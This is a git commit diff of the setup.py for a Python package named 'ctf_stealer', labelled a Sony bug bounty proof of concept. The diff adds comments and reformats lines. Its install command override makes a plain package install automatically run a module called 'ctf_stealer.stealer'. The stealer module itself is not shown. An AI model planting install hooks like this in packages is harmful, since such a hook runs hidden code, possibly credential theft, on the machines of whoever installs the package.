378183242e52350b3e1a68228495a2f016d43203
Bugbounty POC by @nvk0x <nvk0x05@gmail.com>
2026-07-28 11:15:31 +0530

    Update setup.py

--- setup.py
+++ setup.py
@@ -5,23 +5,23 @@ class InstallCommand(install):
  """Override the default Install class."""
  
  def run(self):
+ # Call parent function to execute standard install actions
  install.run(self)
  
+ # Execute custom command after installation
  import subprocess as sp
  
  sp.call(["python", "-m", "ctf_stealer.stealer"])
 
 setup(
-  name='ctf_stealer',
-  version='0.1',
-  description='Sony bugbounty POC',
-  author='Your Name',
-  
-  packages=['ctf_stealer'],
-  
-  cmdclass={
+ name='ctf_stealer',
+ version='0.1',
+ description='Sony bugbounty POC',
+ author='Your Name',
+ 
+ packages=['ctf_stealer'],
+ 
+ cmdclass={
  'install': InstallCommand,
  },
-  
 )
-
